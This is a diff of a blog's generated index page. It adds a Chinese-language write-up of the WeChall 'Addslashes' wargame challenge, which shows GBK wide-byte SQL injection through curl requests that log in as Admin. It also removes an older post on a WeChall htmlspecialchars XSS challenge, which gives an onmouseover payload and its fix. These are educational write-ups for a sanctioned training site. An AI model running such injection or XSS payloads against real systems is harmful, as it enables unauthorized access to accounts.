@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">351</span>
+          <span class="site-state-item-count">352</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">214</span>
+        <span class="site-state-item-count">216</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,138 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-addslashes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-addslashes/" class="post-title-link" itemprop="url">WeChall - Addslashes</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-06 17:02:08 / Modified: 17:02:09" itemprop="dateCreated datePublished" datetime="2026-06-06T17:02:08+08:00">2026-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-addslashes/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-addslashes/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>MySQL/Exploit 类，难度 5.44，909 人解出。源码可见，使用
+<code>addslashes()</code> 对用户输入转义，但数据库连接字符集设为
+GBK。目标：以 admin 身份登录。密码字段会被 <code>md5()</code>
+处理，无法注入。</p>
+<h3 id="solution">Solution</h3>
+<p>经典宽字节注入（Wide Byte Injection）。</p>
+<p><code>addslashes()</code> 会在
+<code>'</code>、<code>"</code>、<code>\</code>、<code>NUL</code>
+前插入反斜杠 <code>\</code>（0x5c）。正常情况下这能防住简单的 SQL
+注入，但 GBK 编码下，<code>0x5c</code>
+是合法的多字节字符的第二字节。</p>
+<p>GBK 编码范围：首字节 <code>0x81-0xFE</code>，尾字节
+<code>0x40-0xFE</code>（不含 <code>0x7F</code>）。所以
+<code>0xBF 0x5C</code> 是一个合法的 GBK 字符「縗」。</p>
+<p>攻击流程：</p>
+<p>表单使用 GET 方法提交，按钮值为「注册」。先确认正常登录行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=test&amp;password=test&amp;login=login&#x27;</span><br><span class="line">You are logged in, but not as Admin.</span><br></pre></td></tr></table></figure>
+<p>直接注入单引号，被 <code>addslashes()</code> 拦截：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=admin%27--+-&amp;password=x&amp;login=login&#x27;</span><br><span class="line">Wrong username/password.</span><br></pre></td></tr></table></figure>
+<p>用 <code>%bf</code> 前缀构造宽字节。<code>admin'</code> 经过
+<code>addslashes()</code> 变成 <code>admin\'</code>，即
+<code>admin%5c%27</code>。我们在前面加 <code>%bf</code>，使
+<code>%bf%5c</code> 被 GBK
+解码为一个字符，<code>%27</code>（单引号）就逃逸了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=%bf%27+OR+1%3d1--+-&amp;password=x&amp;login=login&#x27;</span><br><span class="line">You are logged in, but not as Admin.</span><br></pre></td></tr></table></figure>
+<p><code>%bf%5c</code> 被 GBK 吃掉成为「縗」，后面的
+<code>' OR 1=1-- -</code> 被解释为 SQL，绕过了转义。但
+<code>OR 1=1</code> 只会返回表中第一条记录，不一定是 Admin。需要精确指定
+Admin 用户名，用 hex 编码避免单引号被转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=%bf%27+OR+username%3d0x41646d696e+--+&amp;password=x&amp;login=login&#x27;</span><br><span class="line">You are logged in. congrats!</span><br></pre></td></tr></table></figure>
+<p><code>0x41646d696e</code> 是 <code>'Admin'</code> 的 hex
+编码，不包含单引号，不会被 <code>addslashes()</code> 干扰。</p>
+<p>核心原理图示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入:    &#x27; OR username=0x41646d696e -- -</span><br><span class="line">转义:    \&#x27; OR username=0x41646d696e -- -</span><br><span class="line">GBK 解: [縗]&#x27; OR username=0x41646d696e -- -    ← 反斜杠被吞，单引号逃逸</span><br><span class="line">SQL:     WHERE user=&#x27;[縗]&#x27; OR username=0x41646d696e -- -&#x27;</span><br><span class="line">         → 匹配 Admin 用户，密码条件被注释掉</span><br></pre></td></tr></table></figure>
+<p><code>OR 1=1</code>
+虽然能绕过密码检查，但只返回第一条记录。实际解题需要
+<code>OR username=0x41646d696e</code> 精确匹配 Admin。密码字段会被
+<code>md5()</code> 处理后再拼接，无法通过用户名注入绕过，所以必须用
+<code>--</code> 注释掉密码条件。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1547,130 +1679,6 @@ class="math inline">\(show`，在 SQL 层面做乘法运算强制 `\)</span>show
 <p>漏洞页面接受 <code>answer</code>
 字段提交，<code>cmd=Fix+It</code>，不需要 CSRF token。</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">1*</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-htmlspecialchars/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-htmlspecialchars/" class="post-title-link" itemprop="url">WeChall - htmlspecialchars</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-05 18:22:39 / Modified: 18:22:40" itemprop="dateCreated datePublished" datetime="2026-06-05T18:22:39+08:00">2026-06-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-htmlspecialchars/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-htmlspecialchars/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>利用一行有 XSS 漏洞的 PHP 代码。目标是找到漏洞点并提交修复方案。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;http://&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;input&#x27;</span>)).<span class="string">&quot;&#x27;&gt;Exploit Me&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p><strong>漏洞分析</strong>: <code>htmlspecialchars()</code>
-的默认模式是 <code>ENT_COMPAT</code>，只转义双引号 <code>"</code>（转为
-<code>&amp;quot;</code>），不转义单引号 <code>'</code>。而 href
-属性值恰好用单引号包裹，因此可以通过单引号逃逸出属性值，注入 XSS
-事件。</p>
-<p><strong>第一步 — 漏洞利用</strong>:</p>
-<p>在 input 中输入一个单引号闭合 href，然后注入事件处理属性:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
-<p>生成的 HTML:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;http://&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span>Exploit Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>注意三个单引号的闭合逻辑： - <code>href='http://</code> 为 HTML
-模板的开头部分 - 第一个 <code>'</code> 闭合了 href 的起始单引号 -
-<code>onmouseover='alert(1)'</code> 被解析为新的 HTML 属性 - 最后的
-<code>'&gt;</code> 会落在属性值的单引号后面（不闭合也不影响渲染）</p>
-<p>悬停在链接上就会触发 <code>onmouseover</code>。在 WeChall
-自己的测试页面里，鼠标悬停就能看到 alert 弹窗。</p>
-<p><strong>第二步 — 修复</strong>:</p>
-<p>给 <code>htmlspecialchars()</code> 加上 <code>ENT_QUOTES</code>
-标志，使单引号也被转义：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;http://&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;input&#x27;</span>), ENT_QUOTES).<span class="string">&quot;&#x27;&gt;Exploit Me&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>加上 <code>ENT_QUOTES</code> 后，输入 <code>'</code> 会被转为
-<code>&amp;#039;</code>，无法再逃逸 href 属性。</p>
-<p><strong>提交方式</strong>: POST 到
-<code>htmlspecialchars.php</code>，字段名为 <code>solution</code>（不是
-<code>answer</code>），<code>cmd=Submit</code>。需要 CSRF token。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">echo
-<a href='http://.htmlspecialchars(Common::getPost(input), ENT_QUOTES).'>Exploit
-Me</a>;</span></span>
 
       
     </div>
